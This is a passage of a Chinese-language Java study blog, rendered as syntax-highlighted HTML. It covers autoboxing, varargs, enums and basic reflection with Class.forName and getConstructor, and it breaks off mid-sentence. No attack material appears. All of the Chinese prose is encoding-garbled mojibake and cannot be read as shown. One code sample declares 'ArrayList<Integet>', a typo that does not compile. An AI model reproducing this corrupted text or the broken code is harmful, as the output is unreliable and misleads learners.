punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng2"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng3"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng4"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> e<span class="token operator">:</span>staff<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="å¯¹è±¡åŒ…è£…å™¨ä¸è‡ªåŠ¨è£…ç®±"><a href="#å¯¹è±¡åŒ…è£…å™¨ä¸è‡ªåŠ¨è£…ç®±" class="headerlink" title="å¯¹è±¡åŒ…è£…å™¨ä¸è‡ªåŠ¨è£…ç®±"></a>å¯¹è±¡åŒ…è£…å™¨ä¸è‡ªåŠ¨è£…ç®±</h3><p>æ‰€æœ‰çš„åŸºæœ¬ç±»å‹éƒ½æœ‰ä¸€ä¸ªä¸ä¹‹å¯¹åº”çš„ç±»ã€‚è¿™äº›ç±»ç§°ä¸ºåŒ…è£…å™¨ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span><span class="token punctuation">,</span><span class="token class-name">Long</span><span class="token punctuation">,</span><span class="token class-name">Float</span><span class="token punctuation">,</span><span class="token class-name">Double</span><span class="token punctuation">,</span><span class="token class-name">Short</span><span class="token punctuation">,</span><span class="token class-name">Byte</span><span class="token punctuation">,</span><span class="token class-name">Character</span><span class="token punctuation">,</span><span class="token class-name">Boolean</span> <span class="token punctuation">(</span>å‰å…­ä¸ªç±»æ´¾ç”Ÿäºå…¬å…±çš„è¶…ç±»<span class="token class-name">Number</span><span class="token punctuation">)</span></code></pre><p>åŒ…è£…å™¨ç±»æ˜¯ä¸å¯å˜çš„ï¼Œå³ä¸€æ—¦æ„é€ äº†åŒ…è£…å™¨ï¼Œå°±ä¸å…è®¸æ›´æ”¹åŒ…è£…åœ¨å…¶ä¸­çš„å€¼ã€‚åŒæ—¶ï¼ŒåŒ…è£…å™¨ç±»å‹è¿˜æ˜¯<code>final</code>ï¼Œå› æ­¤ä¸èƒ½æ´¾ç”Ÿå®ƒä»¬çš„å­ç±»ã€‚</p><p>å¯¹äº<code>ArrayList</code>ï¼Œå°–æ‹¬å·ä¸­çš„ç±»å‹ä¸å…è®¸æ˜¯åŸºæœ¬ç±»å‹ï¼Œå› æ­¤è¦ç”¨åˆ°åŒ…è£…å™¨ç±»ï¼Œä¾‹å¦‚<code>Integer</code>ç­‰ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integet</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å¯¹äºè¿™ç§è°ƒç”¨</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> list <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å°†è‡ªåŠ¨å˜æˆï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> list <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è¿™ç§å˜æ¢ç§°ä¸ºè‡ªåŠ¨è£…ç®±ã€‚</p><p>ç›¸åçš„ï¼ŒæŠŠ<code>Integet</code>èµ‹ç»™ä¸€ä¸ª<code>int</code>æ—¶ï¼Œä¼šè‡ªåŠ¨æ‹†ç®±ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> n <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è£…ç®±å’Œæ‹†ç®±æ˜¯ç¼–è¯‘å™¨è¦åšçš„å·¥ä½œï¼Œè€Œä¸æ˜¯è™šæ‹Ÿæœºã€‚<strong>ç¼–è¯‘å™¨</strong>åœ¨ç”Ÿæˆç±»çš„å­—èŠ‚ç æ—¶ä¼šæ’å…¥å¿…è¦çš„æ–¹æ³•è°ƒç”¨ã€‚<strong>è™šæ‹Ÿæœº</strong>åªæ˜¯æ‰§è¡Œè¿™äº›å­—èŠ‚ç ã€‚</p><h3 id="å‚æ•°æ•°é‡å¯å˜çš„æ–¹æ³•"><a href="#å‚æ•°æ•°é‡å¯å˜çš„æ–¹æ³•" class="headerlink" title="å‚æ•°æ•°é‡å¯å˜çš„æ–¹æ³•"></a>å‚æ•°æ•°é‡å¯å˜çš„æ–¹æ³•</h3><p>å¯ä»¥æä¾›å‚æ•°æ•°é‡å¯å˜çš„æ–¹æ³•ï¼ˆæœ‰æ—¶è¿™äº›æ–¹æ³•è¢«ç§°ä¸ºâ€å˜å‚â€(varargs)æ–¹æ³•ï¼‰ã€‚</p><p>è¿™é‡Œçš„çœç•¥å·<code>...</code>æ˜¯Javaä»£ç çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒè¡¨æ˜è¿™ä¸ªæ–¹æ³•å¯ä»¥æ¥æ”¶ä»»æ„æ•°é‡çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printNumber</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">456</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printNumber</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> numbers<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">double</span> e<span class="token operator">:</span>numbers<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>å…è®¸å°†æ•°ç»„ä½œä¸ºæœ€åä¸€ä¸ªå‚æ•°ä¼ é€’ç»™å¯å˜å‚æ•°çš„æ–¹æ³•ã€‚</p><p>å› æ­¤ï¼Œå¦‚æœä¸€ä¸ªå·²æœ‰æ–¹æ³•çš„æœ€åä¸€ä¸ªå‚æ•°æ˜¯æ•°ç»„ï¼Œå¯ä»¥æŠŠå®ƒé‡æ–°å®šä¹‰ä¸ºæœ‰å¯å˜å‚æ•°çš„æ–¹æ³•ï¼Œè€Œä¸ä¼šç ´åä»»ä½•å·²æœ‰çš„ä»£ç ã€‚</p></blockquote><h3 id="æšä¸¾ç±»"><a href="#æšä¸¾ç±»" class="headerlink" title="æšä¸¾ç±»"></a>æšä¸¾ç±»</h3><p>å®šä¹‰æšä¸¾ç±»å‹ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">Size</span> <span class="token punctuation">&#123;</span><span class="token constant">SMALL</span><span class="token punctuation">,</span><span class="token constant">MEDIUM</span><span class="token punctuation">,</span><span class="token constant">LARGE</span><span class="token punctuation">,</span><span class="token constant">EXTRA_LARGE</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>å®é™…ä¸Šï¼Œè¿™ä¸ªå£°æ˜å®šä¹‰çš„ç±»å‹æ˜¯ä¸€ä¸ªç±»ï¼Œå®ƒåˆšå¥½æœ‰å››ä¸ªå®ä¾‹ï¼Œä¸å¯èƒ½æ„é€ æ–°çš„å¯¹è±¡ã€‚</p><p>å› æ­¤ï¼Œåœ¨æ¯”è¾ƒä¸¤ä¸ªæšä¸¾ç±»å‹çš„å€¼æ—¶ï¼Œå¹¶ä¸éœ€è¦è°ƒç”¨<code>equals</code>ï¼Œç›´æ¥ä½¿ç”¨<code>==</code>å°±å¯ä»¥äº†ã€‚</p><p>åŒæ ·å¯ä»¥ä¸ºæšä¸¾ç±»å‹å¢åŠ æ„é€ å™¨ã€æ–¹æ³•å’Œå­—æ®µã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">enum</span> <span class="token class-name">Size</span><span class="token punctuation">&#123;</span>    <span class="token function">SMALL</span><span class="token punctuation">(</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">MEDIUM</span><span class="token punctuation">(</span><span class="token string">"M"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">LARGE</span><span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">EXTRA_LARGE</span><span class="token punctuation">(</span><span class="token string">"XL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> abbreviation<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Size</span><span class="token punctuation">(</span><span class="token class-name">String</span> abbreviation<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>abbreviation <span class="token operator">=</span> abbreviation<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAbbreviation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>abbreviation<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æšä¸¾çš„æ„é€ å™¨æ€»æ˜¯ç§æœ‰çš„ã€‚</p><p>æ‰€æœ‰çš„æšä¸¾ç±»å‹éƒ½æ˜¯<code>Enum</code>ç±»çš„å­ç±»ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token constant">SMALL</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//com.javalearn.Size</span></code></pre><p>å®ƒä»¬ç»§æ‰¿äº†è¿™ä¸ªç±»çš„è®¸å¤šæ–¹æ³•ï¼Œå…¶ä¸­æœ€æœ‰ç”¨çš„ä¸€ä¸ªæ˜¯<code>toString</code>ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›æšä¸¾å¸¸é‡åï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token constant">SMALL</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//SMALL</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token constant">SMALL</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//java.lang.String</span></code></pre><p><code>toString</code>çš„é€†æ–¹æ³•æ˜¯é™æ€<code>valueOf</code>ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Enum</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"SMALL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//SMALL</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Enum</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"SMALL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//com.javalearn.Size</span></code></pre><p>æ¯ä¸ªæšä¸¾ç±»å‹éƒ½æœ‰ä¸€ä¸ªé™æ€çš„<code>values</code>æ–¹æ³•ï¼Œå®ƒå°†è¿”å›ä¸€ä¸ªåŒ…å«å…¨éƒ¨æšä¸¾å€¼çš„æ•°ç»„ã€‚</p><pre class="language-java" data-language="java"><code class="language-java">        <span class="token class-name">Size</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> <span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Size</span> e<span class="token operator">:</span>values<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token comment">/*SMALLMEDIUMLARGEEXTRA_LARGE*/</span></code></pre><p><code>ordinal</code>æ–¹æ³•è¿”å›enumå£°æ˜ä¸­æšä¸¾å¸¸é‡çš„ä½ç½®ï¼Œä½ç½®ä»0å¼€å§‹è®¡æ•°ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token constant">SMALL</span><span class="token punctuation">.</span><span class="token function">ordinal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0</span></code></pre><h3 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h3><p><strong>ï¼ˆä¹‹åä¼šå†ä¸“é—¨é’ˆå¯¹Javaå®‰å…¨ä¸­åå°„çš„åˆ©ç”¨è¿›è¡Œä¸€ä¸‹å­¦ä¹ ï¼‰</strong></p><p>åå°„åº“æä¾›äº†ä¸€ä¸ªä¸°å¯Œä¸”ç²¾å·§çš„å·¥å…·é›†ï¼Œå¯ä»¥ç”¨æ¥ç¼–å†™èƒ½å¤ŸåŠ¨æ€æ“çºµJavaä»£ç çš„ç¨‹åºã€‚</p><p>èƒ½å¤Ÿåˆ†æç±»èƒ½åŠ›çš„ç¨‹åºç§°ä¸º<strong>åå°„</strong>ã€‚</p><p>åå°„æœºåˆ¶å¯ä»¥ç”¨æ¥ï¼š</p><ul><li>åœ¨è¿è¡Œæ—¶åˆ†æç±»çš„èƒ½åŠ›ã€‚</li><li>åœ¨è¿è¡Œæ—¶æ£€æŸ¥å¯¹è±¡ã€‚</li><li>å®ç°æ³›å‹æ•°ç»„æ“ä½œä»£ç ã€‚</li><li>åˆ©ç”¨Methodå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å¾ˆåƒC++ä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚</li></ul><h4 id="Classç±»"><a href="#Classç±»" class="headerlink" title="Classç±»"></a>Classç±»</h4><p>åœ¨ç¨‹åºè¿è¡ŒæœŸé—´ï¼ŒJavaè¿è¡Œæ—¶ç³»ç»Ÿå§‹ç»ˆä¸ºæ‰€æœ‰å¯¹è±¡ç»´æŠ¤ä¸€ä¸ªè¿è¡Œæ—¶ç±»å‹æ ‡è¯†ã€‚è¿™ä¸ªä¿¡æ¯ä¼šè·Ÿè¸ªæ¯ä¸ªå¯¹è±¡æ‰€å±çš„ç±»ã€‚è™šæ‹Ÿæœºåˆ©ç”¨è¿è¡Œæ—¶ç±»å‹ä¿¡æ¯é€‰æ‹©è¦æ‰§è¡Œçš„æ­£ç¡®æ–¹æ³•ã€‚</p><p>å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç‰¹æ®Šçš„Javaç±»è®¿é—®è¿™äº›ä¿¡æ¯ã€‚ä¿å­˜è¿™äº›ä¿¡æ¯çš„ç±»åä¸º<code>Class</code>ã€‚</p><p><code>Object</code>ç±»ä¸­çš„<code>getClass()</code>æ–¹æ³•å°†ä¼šè¿”å›ä¸€ä¸ª<code>Class</code>ç±»å‹çš„å®ä¾‹ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//class com.javalearn.Employee</span></code></pre><p><code>Class</code>å¯¹è±¡ä¼šæè¿°ä¸€ä¸ªç‰¹å®šç±»çš„å±æ€§ã€‚æœ€å¸¸ç”¨çš„Classæ–¹æ³•å°±æ˜¯<code>getName</code>ã€‚è¿™ä¸ªæ–¹æ³•å°†è¿”å›ç±»çš„åå­—ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å¦‚æœç±»åœ¨ä¸€ä¸ªåŒ…é‡Œï¼ŒåŒ…çš„åå­—ä¹Ÿä½œä¸ºç±»åçš„ä¸€éƒ¨åˆ†ã€‚æ‰€ä»¥æˆ‘è¿™é‡Œä¼šè¿”å›<code>com.javalearn.Employee</code></p><p>è¿˜å¯ä»¥ä½¿ç”¨é™æ€æ–¹æ³•<code>forName</code>è·å¾—ç±»åå¯¹åº”çš„<code>Class</code>å¯¹è±¡ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token string">"com.javalearn.Employee"</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è·å¾—<code>Class</code>ç±»å¯¹è±¡çš„ç¬¬ä¸‰ç§æ–¹æ³•æ˜¯ä¸€ä¸ªå¾ˆæ–¹ä¾¿çš„å¿«æ·æ–¹å¼ã€‚å¦‚æœTæ˜¯ä»»æ„çš„Javaç±»å‹ï¼ˆæˆ–voidå…³é”®å­—ï¼‰ï¼Œ<code>T.class</code>å°†ä»£è¡¨åŒ¹é…çš„ç±»å¯¹è±¡ã€‚</p><blockquote><p><code>Class</code>ç±»å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ³›å‹ç±»ã€‚</p></blockquote><p>è™šæ‹Ÿæœºä¸ºæ¯ä¸ªç±»å‹ç®¡ç†ä¸€ä¸ªå”¯ä¸€çš„<code>Class</code>å¯¹è±¡ã€‚å› æ­¤ï¼Œå¯ä»¥åˆ©ç”¨<code>==</code>è¿ç®—ç¬¦å®ç°ä¸¤ä¸ªç±»å¯¹è±¡çš„æ¯”è¾ƒã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">Employee</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¦‚æœæœ‰ä¸€ä¸ª<code>Class</code>ç±»å‹çš„å¯¹è±¡ï¼Œå¯ä»¥ç”¨å®ƒæ„é€ ç±»çš„å®ä¾‹ã€‚è°ƒç”¨<code>getConstructor</code>æ–¹æ³•å°†å¾—åˆ°ä¸€ä¸ª<code>Constructor</code>ç±»å‹çš„å¯¹è±¡ï¼Œç„¶åä½¿ç”¨<code>newInstance</code>æ–¹æ³•æ¥æ„é€ ä¸€ä¸ªå®ä¾‹ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token string">"com.javalearn.Employee"</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> obj <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ä½†æ˜¯è¿™ä¸ªç±»å¦‚æœæ²¡æœ‰æ— å‚æ•°çš„æ„é€ å™¨ï¼Œ<code>getConstructor</code>æ–¹æ³•ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><h4 id="å£°æ˜å¼‚å¸¸å…¥é—¨"><a href="#å£°æ˜å¼‚å¸¸å…¥é—¨" class="headerlink" title="å£°æ˜å¼‚å¸¸å…¥é—¨"></a>å£°æ˜å¼‚å¸¸å…¥é—¨</h4><p>å½“è¿è¡Œæ—¶å‘ç”Ÿé”™è¯¯æ—¶ï¼Œç¨‹åºå°±ä¼šâ€œæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸â€ã€‚æˆ‘ä»¬å¯ä»¥æä¾›ä¸€ä¸ªå¤„ç†å™¨â€œæ•è·â€è¿™ä¸ªå¼‚å¸¸å¹¶è¿›è¡Œå¤„ç†ã€‚</p><p>å¼‚å¸¸æœ‰ä¸¤ç§ç±»å‹ï¼Œéæ£€æŸ¥å‹å¼‚å¸¸å’Œæ£€æŸ¥å‹å¼‚å¸¸ã€‚</p><p>å¦‚æœä¸€ä¸ªæ–¹æ³•åŒ…å«ä¸€æ¡å¯èƒ½æŠ›å‡ºæ£€æŸ¥å‹å¼‚å¸¸çš„è¯­å¥ï¼Œåˆ™åœ¨æ–¹æ³•åä¸Šå¢åŠ ä¸€ä¸ª<code>throws</code>å­å¥ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ReflectiveOperationException</span> <span class="token punctuation">&#123;</span></code></pre><p>è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„ä»»ä½•æ–¹æ³•ä¹Ÿéƒ½éœ€è¦ä¸€ä¸ª<code>throws</code>å£°æ˜ã€‚</p><h4 id="åˆ©ç”¨åå°„åˆ†æç±»çš„èƒ½åŠ›"><a href="#åˆ©ç”¨åå°„åˆ†æç±»çš„èƒ½åŠ›" class="headerlink" title="åˆ©ç”¨åå°„åˆ†æç±»çš„èƒ½åŠ›"></a>åˆ©ç”¨åå°„åˆ†æç±»çš„èƒ½åŠ›</h4><p>åœ¨<code>java.lang.reflect</code>åŒ…ä¸­æœ‰ä¸‰ä¸ªç±»<code>Fieldã€Methodå’ŒConstructor</code>åˆ†åˆ«ç”¨äºæè¿°ç±»çš„å­—æ®µã€æ–¹æ³•å’Œæ„é€ å™¨ã€‚è¿™ä¸‰ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªå«åš<code>getName</code>çš„æ–¹æ³•ï¼Œç”¨æ¥è¿”å›å­—æ®µã€æ–¹æ³•æˆ–æ„é€ 